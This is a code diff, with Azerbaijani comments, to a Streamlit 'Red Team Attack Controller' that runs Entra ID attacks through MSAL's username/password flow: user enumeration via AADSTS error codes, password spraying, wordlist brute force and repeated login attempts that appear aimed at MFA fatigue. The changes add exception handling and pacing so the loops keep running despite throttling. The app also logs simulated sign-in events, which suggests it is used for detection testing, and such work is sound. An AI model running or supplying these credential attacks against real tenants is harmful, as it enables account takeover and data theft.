@@ -938,19 +938,28 @@ elif selected_menu == "⚔️ Red Team Attack Controller":
             terminal_placeholder.code("\n".join(console_logs), language="bash")
 
             for user in attack_engine.users[:max_targets_count]:
-                result = attack_engine.public_app.acquire_token_by_username_password(
-                    username=user, password="DummyPassword123!", scopes=["https://graph.microsoft.com/.default"]
-                )
-                err_desc = result.get("error_description", "")
-                if any(code in err_desc for code in ["AADSTS50126", "AADSTS50055", "AADSTS50053", "AADSTS7000218"]):
-                    status_text = f"[+] MÖVCUDDUR (Valid User): {user}"
-                elif "AADSTS50034" in err_desc:
-                    status_text = f"[-] MÖVCUD DEYİL (Invalid User): {user}"
-                else:
-                    status_text = f"[?] CAVAB ({user}): {err_desc[:40]}..."
+                # BUG FIX: eyni MSAL exception riski (throttling/429, realm discovery
+                # xətası) burada da mövcuddur — enumeration da çoxlu istifadəçini
+                # ardıcıl sorğulayır. try/except olmadan bir tək throttled sorğu
+                # bütün tətbiqi crash edə bilər.
+                try:
+                    result = attack_engine.public_app.acquire_token_by_username_password(
+                        username=user, password="DummyPassword123!", scopes=["https://graph.microsoft.com/.default"]
+                    )
+                    err_desc = result.get("error_description", "")
+                    if any(code in err_desc for code in ["AADSTS50126", "AADSTS50055", "AADSTS50053", "AADSTS7000218"]):
+                        status_text = f"[+] MÖVCUDDUR (Valid User): {user}"
+                    elif "AADSTS50034" in err_desc:
+                        status_text = f"[-] MÖVCUD DEYİL (Invalid User): {user}"
+                    else:
+                        status_text = f"[?] CAVAB ({user}): {err_desc[:40]}..."
+                except Exception as e:
+                    status_text = f"[-] UĞURSUZ (exception): {user} -> ({str(e)[:60]}...)"
+                    time.sleep(1.5)  # throttling ehtimalını azaltmaq üçün əlavə gözləmə
 
                 console_logs.append(status_text)
                 terminal_placeholder.code("\n".join(console_logs), language="bash")
+                time.sleep(0.3)  # BUG FIX: enumeration-da da heç bir gecikmə yox idi
 
         elif btn_spray:
             if not spray_password_input:
@@ -960,15 +969,40 @@ elif selected_menu == "⚔️ Red Team Attack Controller":
                 terminal_placeholder.code("\n".join(console_logs), language="bash")
 
                 for user in attack_engine.users[:max_targets_count]:
-                    result = attack_engine.public_app.acquire_token_by_username_password(
-                        username=user, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
-                    )
+                    # BUG FIX (crash kök səbəbi): MSAL bəzi hallarda (throttling/429,
+                    # şəbəkə xətası, user_realm_discovery uğursuzluğu) OAuth error
+                    # dict-i QAYTARMIR — birbaşa exception (MsalServiceError və s.)
+                    # atır. Əvvəlki kod bunu gözləmirdi və ilk belə hadisədə BÜTÜN
+                    # Streamlit tətbiqi crash edirdi. İndi hər cəhd ayrıca qorunur.
+                    try:
+                        result = attack_engine.public_app.acquire_token_by_username_password(
+                            username=user, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
+                        )
+                    except Exception as e:
+                        res_line = f"[-] UĞURSUZ (exception): {user} -> ({str(e)[:80]}...)"
+                        console_logs.append(res_line)
+                        terminal_placeholder.code("\n".join(console_logs), language="bash")
+                        new_events.append({
+                            "EventID": 4625,
+                            "TargetUserName": user,
+                            "IpAddress": "185.220.101.5",
+                            "Status": "FAILED",
+                            "AuthMethod": "PasswordSpray",
+                            "ErrorCode": f"MSAL_EXCEPTION: {type(e).__name__}",
+                            "Timestamp": datetime.utcnow().isoformat() + "Z"
+                        })
+                        # Throttling ehtimalını azaltmaq üçün xətadan sonra bir az
+                        # daha uzun gözləyib davam edirik (loop-u dayandırmırıq).
+                        time.sleep(1.5)
+                        continue
+
                     if "access_token" in result:
                         res_line = f"[+] UĞURLU: {user}"
                         evt_id = 4624
                         status = "SUCCESS"
                     else:
-                        err = result.get("error_description", "").splitlines()[0]
+                        err_desc = result.get("error_description", "")
+                        err = err_desc.splitlines()[0] if err_desc else result.get("error", "naməlum xəta")
                         res_line = f"[-] UĞURSUZ: {user} -> ({err[:40]}...)"
                         evt_id = 4625
                         status = "FAILED"
@@ -985,6 +1019,12 @@ elif selected_menu == "⚔️ Red Team Attack Controller":
                         "ErrorCode": result.get("error", "None"),
                         "Timestamp": datetime.utcnow().isoformat() + "Z"
                     })
+
+                    # BUG FIX: əvvəllər YALNIZ spray loop-unda heç bir gecikmə yox
+                    # idi (brute force-da sleep(1), MFA fatigue-də sleep(2) var idi).
+                    # Sürətli-ardıcıl MSAL sorğuları Entra ID-ni throttle edir —
+                    # yuxarıdakı exception-un əsl kök səbəbi məhz bu idi.
+                    time.sleep(0.4)
 
         elif btn_brute:
             console_logs.append(f"[*] Executing Brute Force against {target_user_input}...\n")
@@ -1003,9 +1043,18 @@ elif selected_menu == "⚔️ Red Team Attack Controller":
                 test_passwords = wordlist_sample
 
             for pwd in test_passwords:
-                result = attack_engine.public_app.acquire_token_by_username_password(
-                    username=target_user_input, password=pwd, scopes=["https://graph.microsoft.com/.default"]
-                )
+                # BUG FIX: MSAL exception (throttling/429, realm discovery) riski
+                # burada da mövcuddur — try/except olmadan crash ehtimalı var idi.
+                try:
+                    result = attack_engine.public_app.acquire_token_by_username_password(
+                        username=target_user_input, password=pwd, scopes=["https://graph.microsoft.com/.default"]
+                    )
+                except Exception as e:
+                    console_logs.append(f"[-] UĞURSUZ (exception): {pwd} -> ({str(e)[:60]}...)")
+                    terminal_placeholder.code("\n".join(console_logs), language="bash")
+                    time.sleep(1.5)
+                    continue
+
                 if "access_token" in result:
                     console_logs.append(f"[+] UĞURLU: Doğru şifrə tapıldı -> '{pwd}'")
                     terminal_placeholder.code("\n".join(console_logs), language="bash")
@@ -1018,7 +1067,8 @@ elif selected_menu == "⚔️ Red Team Attack Controller":
                         console_logs.append(f"[+] User Info Retrieved: {u_data.get('displayName')} ({u_data.get('userPrincipalName')})")
                     break
                 else:
-                    err = result.get("error_description", "").splitlines()[0]
+                    err_desc = result.get("error_description", "")
+                    err = err_desc.splitlines()[0] if err_desc else result.get("error", "naməlum xəta")
                     console_logs.append(f"[-] UĞURSUZ: {pwd} -> ({err[:35]}...)")
                     terminal_placeholder.code("\n".join(console_logs), language="bash")
                 time.sleep(0.5)
@@ -1032,11 +1082,15 @@ elif selected_menu == "⚔️ Red Team Attack Controller":
             else:
                 for i in range(1, 3):
                     console_logs.append(f"[*] Attempt #{i}...")
-                    result = attack_engine.public_app.acquire_token_by_username_password(
-                        username=target_user_input, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
-                    )
-                    err_desc = result.get("error_description", "")
-                    first_line = err_desc.splitlines()[0] if err_desc else "Success/Token"
+                    # BUG FIX: eyni MSAL exception riski buradadır da qorunur.
+                    try:
+                        result = attack_engine.public_app.acquire_token_by_username_password(
+                            username=target_user_input, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
+                        )
+                        err_desc = result.get("error_description", "")
+                        first_line = err_desc.splitlines()[0] if err_desc else "Success/Token"
+                    except Exception as e:
+                        first_line = f"exception: {str(e)[:60]}"
                     console_logs.append(f" └─ Response: {first_line[:55]}...")
                     terminal_placeholder.code("\n".join(console_logs), language="bash")
                     time.sleep(1)
